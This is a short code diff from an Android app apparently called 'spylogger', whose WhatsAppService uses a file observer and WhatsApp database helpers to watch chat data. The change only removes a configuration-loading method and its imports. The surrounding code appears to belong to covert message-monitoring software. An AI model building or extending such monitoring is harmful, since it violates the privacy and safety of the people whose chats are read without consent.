@@ -8,8 +8,6 @@ import android.os.FileObserver;
 import android.os.IBinder;
 import android.util.Log;
 
-import com.gravatasufoca.spylogger.model.Configuracao;
-import com.gravatasufoca.spylogger.dao.DatabaseHelper;
 import com.gravatasufoca.spylogger.dao.whatsapp.DatabaseHelperExternal;
 import com.gravatasufoca.spylogger.dao.whatsapp.DatabaseHelperInternal;
 import com.gravatasufoca.spylogger.model.whatsapp.ChatList;
@@ -36,7 +34,6 @@ public class WhatsAppService extends Service {
 
 	private DatabaseHelperInternal internal;
 	private DatabaseHelperExternal external;
-	private Configuracao configuracao;
     private final IBinder mBinder = new LocalBinder();
     private boolean loaded=false;
 
@@ -159,29 +156,6 @@ public class WhatsAppService extends Service {
 		};
 		Utils.whatsObserver.startWatching(); // START OBSERVING
 	}
-
-
-	public Configuracao getConfiguracao() {
-		if(configuracao==null){
-			DatabaseHelper database = new DatabaseHelper(
-					getApplicationContext());
-			List<Configuracao> confs;
-			try {
-				confs = database.getConfiguracaoDao().queryForAll();
-				Configuracao conf = null;
-
-				if (confs.size() > 0) {
-					conf = confs.get(0);
-				}
-				if (conf != null) {
-					configuracao=conf;
-				}
-			} catch (Exception e) {
-			}
-		}
-		return configuracao;
-	}
-
 
 	private void updateMsg() {
 
